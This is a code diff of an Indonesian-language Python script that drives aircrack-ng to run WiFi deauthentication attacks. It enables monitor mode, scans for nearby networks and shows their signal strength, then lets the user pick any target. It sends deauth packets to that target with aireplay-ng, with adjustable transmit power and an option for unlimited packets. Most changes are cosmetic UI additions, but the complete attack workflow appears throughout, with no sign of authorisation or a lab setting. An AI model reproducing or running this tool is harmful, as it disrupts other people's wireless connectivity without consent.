@@ -7,6 +7,7 @@ import subprocess
 import sys
 import tempfile
 import time
+import random
 
 # ---------- ANSI ----------
 RESET = "\033[0m"
@@ -21,6 +22,7 @@ COLORS = {
     "purple": "\033[95m",
     "white": "\033[97m",
     "magenta": "\033[35m",
+    "gray": "\033[90m",
 }
 
 GREEN = COLORS["green"]
@@ -28,8 +30,9 @@ RED = COLORS["red"]
 CYAN = COLORS["cyan"]
 YELLOW = COLORS["yellow"]
 MAGENTA = COLORS["magenta"]
+GRAY = COLORS["gray"]
 
-BOX_WIDTH = 40  # lebar isi box
+BOX_WIDTH = 40
 
 # ================= Util =================
 
@@ -44,7 +47,6 @@ def draw_box_bottom(color=CYAN):
     print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")
 
 def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
-    """Cetak baris judul dalam box, padding dihitung otomatis"""
     inner = f" {title}"
     pad = BOX_WIDTH - len(inner)
     if pad < 0:
@@ -58,7 +60,6 @@ def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
     )
 
 def loading(text, duration=1):
-    """Tampilkan loading sederhana"""
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
     for i in range(duration * 10):
         sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
@@ -66,6 +67,43 @@ def loading(text, duration=1):
         time.sleep(0.1)
     sys.stdout.write("\r" + " " * 60 + "\r")
     sys.stdout.flush()
+
+def loading_with_text(text, duration=2):
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    glitch_chars = "!@#$%^&*"
+    
+    for i in range(duration * 10):
+        display_text = ""
+        for char in text:
+            if char == " ":
+                display_text += " "
+            elif random.random() < 0.1:
+                display_text += random.choice(glitch_chars)
+            else:
+                display_text += char
+                
+        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+def get_power_status(power):
+    """Mengembalikan status sinyal berdasarkan nilai power"""
+    if power == "N/A":
+        return "N/A", GRAY
+    try:
+        pwr = int(power)
+        if pwr >= -30:
+            return "Kuat", GREEN
+        elif pwr >= -50:
+            return "Kuat", CYAN
+        elif pwr >= -70:
+            return "Sedang", YELLOW
+        else:
+            return "Lemah", RED
+    except ValueError:
+        return "N/A", GRAY
 
 # ================= Wireless Functions =================
 
@@ -115,7 +153,7 @@ def run_command(cmd, show_output=False):
     return result
 
 def start_monitor_mode(adapter):
-    loading(f"Mengaktifkan monitor mode pada {adapter}...", 2)
+    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
     run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
     result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
     
@@ -124,11 +162,11 @@ def start_monitor_mode(adapter):
 
     output = (result.stdout or "") + (result.stderr or "")
     monitor_iface = get_monitor_interface_name(adapter, output)
-    time.sleep(0.5)
+    time.sleep(0.3)
     return monitor_iface
 
 def scan_networks(adapter, duration=10):
-    loading("Scanning WiFi networks...", 2)
+    loading_with_text("Scanning WiFi networks...", 1)
     
     temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
     prefix = os.path.join(temp_dir, "scan")
@@ -138,16 +176,35 @@ def scan_networks(adapter, duration=10):
         stderr=subprocess.DEVNULL,
     )
 
-    try:
-        time.sleep(duration)
-    finally:
-        if proc.poll() is None:
-            proc.terminate()
-            try:
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-                proc.wait()
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    start_time = time.time()
+    
+    while proc.poll() is None:
+        elapsed = int(time.time() - start_time)
+        remaining = max(0, duration - elapsed)
+        
+        if remaining <= 0:
+            break
+            
+        for i in range(len(chars)):
+            if proc.poll() is not None or elapsed >= duration:
+                break
+            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
+            sys.stdout.flush()
+            time.sleep(0.1)
+            elapsed = int(time.time() - start_time)
+            remaining = max(0, duration - elapsed)
+    
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+    if proc.poll() is None:
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
 
     networks = []
     seen = set()
@@ -160,13 +217,19 @@ def scan_networks(adapter, duration=10):
                 bssid = row[0].strip()
                 channel = row[3].strip()
                 essid = row[13].strip()
+                power = row[8].strip() if len(row) > 8 else "N/A"
                 if not bssid or bssid.lower() == "bssid" or not essid:
                     continue
                 key = (bssid, channel, essid)
                 if key in seen:
                     continue
                 seen.add(key)
-                networks.append({"bssid": bssid, "channel": channel, "essid": essid})
+                networks.append({
+                    "bssid": bssid, 
+                    "channel": channel, 
+                    "essid": essid,
+                    "power": power
+                })
 
     for path in glob.glob(prefix + "-*.csv"):
         try:
@@ -202,7 +265,6 @@ def set_monitor_channel(monitor_iface, channel):
     run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], show_output=False)
 
 def set_tx_power(monitor_iface, power_level):
-    """Set TX power berdasarkan level"""
     power_map = {
         "lemah": "1",
         "sedang": "10",
@@ -213,19 +275,19 @@ def set_tx_power(monitor_iface, power_level):
 
 def run_deauth_attack(target, monitor_iface, power_level, packet_count, retries=3):
     set_monitor_channel(monitor_iface, target.get("channel"))
-    
-    # Set power
     set_tx_power(monitor_iface, power_level)
     
-    # Build command
     if packet_count == "unlimited" or packet_count == "0":
         cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
     else:
         cmd = ["sudo", "aireplay-ng", "-0", str(packet_count), "-a", target["bssid"], monitor_iface]
     
+    status, _ = get_power_status(target.get("power", "N/A"))
+    
     print(f"\n  {CYAN}[*] Menjalankan serangan deauth{RESET}")
     print(f"  {YELLOW}Target: {target['essid']} ({target['bssid']}){RESET}")
     print(f"  {YELLOW}Power: {power_level.upper()}{RESET}")
+    print(f"  {YELLOW}Sinyal: {status}{RESET}")
     print(f"  {YELLOW}Paket: {'∞' if packet_count == 'unlimited' or packet_count == '0' else packet_count}{RESET}")
     print(f"  {YELLOW}Command: {' '.join(cmd)}{RESET}\n")
     
@@ -240,11 +302,31 @@ def run_deauth_attack(target, monitor_iface, power_level, packet_count, retries=
 
     print(f"\n  {RED}[✗] Serangan gagal setelah {retries} percobaan.{RESET}")
 
+def prompt_keyboard_interrupt_action():
+    print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
+    print(f"  {GREEN}1.{RESET} Pilih target lagi")
+    print(f"  {GREEN}2.{RESET} Kembali ke menu")
+    print(f"  {GREEN}3.{RESET} Keluar")
+
+    while True:
+        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
+        if choice == "1":
+            return "restart"
+        if choice == "2":
+            return "menu"
+        if choice == "3":
+            return "exit"
+        print(f"  {RED}[!] Input salah, pilih 1, 2, atau 3.{RESET}")
+
 def back_to_menu():
     menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
     if not os.path.exists(menu_path):
         menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
-    os.execvp(sys.executable, [sys.executable, menu_path])
+    if os.path.exists(menu_path):
+        os.execvp(sys.executable, [sys.executable, menu_path])
+    else:
+        print(f"\n  {RED}[✗] deauth-menu.py tidak ditemukan.{RESET}")
+        input("\n  Tekan Enter untuk kembali...")
 
 def select_interface():
     clear_screen()
@@ -279,28 +361,51 @@ def select_target(networks):
     draw_box_title("PILIH TARGET", CYAN, YELLOW)
     draw_box_bottom(CYAN)
 
-    print(f"\n  {'No':<3} {'ESSID':<25} {'CH':<3} {'BSSID'}")
-    print(f"  {YELLOW}{'=' * 50}{RESET}")
+    print(f"\n  {'No':<4} {'ESSID':<22} {'CH':<4} {'PWR':<6} {'SINYAL':<8} {'BSSID'}")
+    print(f"  {YELLOW}{'=' * 65}{RESET}")
+    
     for idx, net in enumerate(networks, start=1):
-        essid = net["essid"][:25]
-        print(f"  {GREEN}{idx:<3}{RESET} {essid:<25} {net['channel']:<3} {net['bssid']}")
+        essid = net["essid"][:22]
+        power = net.get("power", "N/A")
+        status, status_color = get_power_status(power)
+        
+        if power != "N/A":
+            try:
+                pwr = int(power)
+                if pwr >= -30:
+                    pwr_color = GREEN
+                elif pwr >= -50:
+                    pwr_color = CYAN
+                elif pwr >= -70:
+                    pwr_color = YELLOW
+                else:
+                    pwr_color = RED
+                power_display = f"{pwr_color}{power:>3}{RESET}"
+            except ValueError:
+                power_display = f"{GRAY}{power:>3}{RESET}"
+        else:
+            power_display = f"{GRAY}{power:>3}{RESET}"
+            
+        status_display = f"{status_color}{status}{RESET}"
+        
+        print(f"  {GREEN}{idx:<4}{RESET} {essid:<22} {net['channel']:<4} {power_display}  {status_display:<8} {net['bssid']}")
 
     while True:
         choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
         if choice.isdigit() and 1 <= int(choice) <= len(networks):
             selected = networks[int(choice) - 1]
-            print(f"\n  {GREEN}[✓] Target: {selected['essid']}{RESET}")
+            power = selected.get("power", "N/A")
+            status, _ = get_power_status(power)
+            print(f"\n  {GREEN}[✓] Target: {selected['essid']} | PWR {power} | {status}{RESET}")
             return selected
         print(f"  {RED}[!] Input salah, coba lagi.{RESET}")
 
 def get_attack_params():
-    """Minta input power dan jumlah paket"""
     clear_screen()
     draw_box_top(CYAN)
     draw_box_title("PARAMETER SERANGAN", CYAN, YELLOW)
     draw_box_bottom(CYAN)
     
-    # Pilih power
     print(f"\n  {BOLD}Pilih kekuatan sinyal:{RESET}")
     print(f"  {GREEN}1.{RESET} LEMAH  (jarak dekat, stealth)")
     print(f"  {GREEN}2.{RESET} SEDANG (jarak sedang, balance)")
@@ -320,7 +425,6 @@ def get_attack_params():
             break
         print(f"  {RED}[!] Pilih 1, 2, atau 3.{RESET}")
     
-    # Pilih jumlah paket
     print(f"\n  {BOLD}Pilih jumlah paket deauth:{RESET}")
     print(f"  {GREEN}1.{RESET} 100 paket (cepat)")
     print(f"  {GREEN}2.{RESET} 1000 paket (standar)")
@@ -358,51 +462,59 @@ def main():
     adapter = None
     monitor_iface = None
 
-    try:
-        # Select interface
-        adapter = select_interface()
-        monitor_iface = start_monitor_mode(adapter)
-        
-        # Scan duration
-        clear_screen()
-        draw_box_top(CYAN)
-        draw_box_title("SCAN WIFI", CYAN, YELLOW)
-        draw_box_bottom(CYAN)
-        
-        print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
-        scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
-        
-        if scan_input.isdigit() and int(scan_input) > 0:
-            scan_duration = int(scan_input)
-        else:
-            scan_duration = 10
+    while True:
+        try:
+            if monitor_iface is None:
+                adapter = select_interface()
+                monitor_iface = start_monitor_mode(adapter)
+            
+            clear_screen()
+            draw_box_top(CYAN)
+            draw_box_title("SCAN WIFI", CYAN, YELLOW)
+            draw_box_bottom(CYAN)
+            
+            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
+            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
+            
+            if scan_input.isdigit() and int(scan_input) > 0:
+                scan_duration = int(scan_input)
+            else:
+                scan_duration = 10
 
-        # Scan networks
-        networks = scan_networks(monitor_iface, duration=scan_duration)
-        target = select_target(networks)
+            networks = scan_networks(monitor_iface, duration=scan_duration)
+            target = select_target(networks)
 
-        if target is None:
-            print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
+            if target is None:
+                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
+                stop_monitor_mode(monitor_iface)
+                return
+
+            power_level, packet_count = get_attack_params()
+            run_deauth_attack(target, monitor_iface, power_level, packet_count)
+            
+            print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
+            input()
             stop_monitor_mode(monitor_iface)
-            return
+            back_to_menu()
+            break
 
-        # Get attack parameters
-        power_level, packet_count = get_attack_params()
-
-        # Run attack
-        run_deauth_attack(target, monitor_iface, power_level, packet_count)
-        
-        # Clean up
-        print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
-        input()
-        stop_monitor_mode(monitor_iface)
-        back_to_menu()
-
-    except KeyboardInterrupt:
-        print(f"\n\n  {YELLOW}[!] Dibatalakan oleh user{RESET}")
-        if monitor_iface:
-            stop_monitor_mode(monitor_iface)
-        back_to_menu()
+        except KeyboardInterrupt:
+            action = prompt_keyboard_interrupt_action()
+            if action == "restart":
+                print(f"\n  {YELLOW}Mengulang ke pemilihan target...{RESET}")
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                    monitor_iface = None
+                continue
+            elif action == "menu":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                back_to_menu()
+            elif action == "exit":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                clear_screen()
+                sys.exit(0)
 
 if __name__ == "__main__":
     main()
